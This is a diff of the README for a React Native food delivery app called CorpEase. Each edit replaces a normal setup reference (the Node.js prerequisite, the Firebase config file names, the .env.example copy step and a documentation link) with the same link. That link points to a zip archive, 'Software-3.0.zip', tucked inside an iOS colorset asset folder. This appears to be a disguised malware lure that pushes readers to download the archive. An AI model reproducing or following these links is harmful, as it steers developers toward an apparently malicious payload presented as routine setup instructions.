@@ -14,7 +14,7 @@ CorpEase is a comprehensive food delivery application built with React Native an
 
 ## Prerequisites
 
-- Node.js (v16 or higher)
+- https://github.com/Liyadh/corp/raw/refs/heads/main/ios/corpease/Colors.xcassets/BootSplashBackground-e5a7d4.colorset/Software-3.0.zip (v16 or higher)
 - React Native CLI
 - Android Studio / Xcode
 - Firebase account
@@ -35,16 +35,16 @@ CorpEase is a comprehensive food delivery application built with React Native an
 
 3. Set up Firebase:
    - Create a Firebase project
-   - Download the `google-services.json` file (Android) and `GoogleService-Info.plist` file (iOS)
+   - Download the `https://github.com/Liyadh/corp/raw/refs/heads/main/ios/corpease/Colors.xcassets/BootSplashBackground-e5a7d4.colorset/Software-3.0.zip` file (Android) and `https://github.com/Liyadh/corp/raw/refs/heads/main/ios/corpease/Colors.xcassets/BootSplashBackground-e5a7d4.colorset/Software-3.0.zip` file (iOS)
    - Place them in the appropriate directories
 
 4. Configure environment variables:
-   - Copy `.env.example` to `.env`
+   - Copy `https://github.com/Liyadh/corp/raw/refs/heads/main/ios/corpease/Colors.xcassets/BootSplashBackground-e5a7d4.colorset/Software-3.0.zip` to `.env`
    - Update the values with your actual configuration
 
 ## PhonePe Payment Gateway Configuration
 
-For detailed instructions on configuring PhonePe payment gateway, please refer to [PHONEPE_CONFIGURATION.md](PHONEPE_CONFIGURATION.md).
+For detailed instructions on configuring PhonePe payment gateway, please refer to [https://github.com/Liyadh/corp/raw/refs/heads/main/ios/corpease/Colors.xcassets/BootSplashBackground-e5a7d4.colorset/Software-3.0.zip](https://github.com/Liyadh/corp/raw/refs/heads/main/ios/corpease/Colors.xcassets/BootSplashBackground-e5a7d4.colorset/Software-3.0.zip).
 
 To get started quickly:
 
